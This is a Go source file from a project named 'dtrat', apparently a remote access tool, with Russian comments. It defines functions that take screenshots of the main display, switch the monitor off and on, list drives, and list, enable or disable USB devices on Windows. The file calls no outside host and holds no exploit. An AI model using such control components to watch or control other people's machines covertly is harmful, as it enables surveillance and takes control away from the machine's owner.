package system

import (
	"dtrat/engine/system/usbwin"
	"dtrat/errs"
	"fmt"
	"image/png"
	"os"
	"path/filepath"
	"runtime"

	"github.com/kbinani/screenshot"
)

type System struct{}

func NewSystem() (*System, error) {
	s := System{}
	return &s, nil
}

func (s *System) Close() {

}

func (s *System) Screenshot() (string, error) {
	n := screenshot.NumActiveDisplays()
	if n <= 0 {
		return "", fmt.Errorf("screenshot.NumActiveDisplays: Активные дисплеи не найдены")
	}

	bounds := screenshot.GetDisplayBounds(0)
	img, err := screenshot.CaptureRect(bounds)
	if err != nil {
		return "", fmt.Errorf("screenshot.CaptureRect: %w", err)
	}

	filename := "screenshot.png"
	file, err := os.Create(filename)
	if err != nil {
		return "", fmt.Errorf("os.Create: %w", err)
	}
	defer file.Close()

	err = png.Encode(file, img)
	if err != nil {
		return "", fmt.Errorf("png.Encode: %w", err)
	}

	path, err := filepath.Abs(filename)
	if err != nil {
		return filename, nil
	}
	return path, nil
}

func (s *System) MonitorState(enabled bool) error {
	return setMonitorState(enabled)
}

func (s *System) Drives() []string {
	if runtime.GOOS != "windows" {
		return []string{"/"}
	}

	var drives []string
	// Проверяем буквы от A до Z
	for _, drive := range "ABCDEFGHIJKLMNOPQRSTUVWXYZ" {
		drivePath := string(drive) + ":\\"
		if _, err := os.Stat(drivePath); err == nil {
			drives = append(drives, drivePath)
		}
	}
	return drives
}

func (s *System) GetUSBDevices() ([]usbwin.USBDevice, error) {
	if runtime.GOOS != "windows" {
		return nil, errs.ErrUnsupportedOs
	}

	return usbwin.GetUSBDevices()
}

func (s *System) SetUSBDeviceState(DeviceID string, enabled bool) error {
	if runtime.GOOS != "windows" {
		return errs.ErrUnsupportedOs
	}

	if enabled {
		err := usbwin.EnableDevice(DeviceID)
		if err == nil {
			return nil
		}

		return usbwin.EnableDevicePnPUtil(DeviceID)
	} else {
		err := usbwin.DisableDevice(DeviceID)
		if err == nil {
			return nil
		}

		return usbwin.DisableDevicePnPUtil(DeviceID)
	}
}
